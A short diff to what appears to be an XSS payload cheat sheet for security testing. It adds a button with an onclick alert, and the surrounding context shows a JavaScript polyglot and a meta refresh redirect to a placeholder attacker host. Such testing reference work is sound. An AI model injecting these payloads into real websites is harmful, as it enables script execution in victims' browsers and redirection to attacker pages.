@@ -41,6 +41,9 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 
 ## Testing XSS in Various Scenarios
 ```javascript
+<button onclick=alert("xss")>click</button>
+```
+```javascript
 <meta http-equiv="refresh" content='0; url=https://evil.com/
 ```
 ```javascript
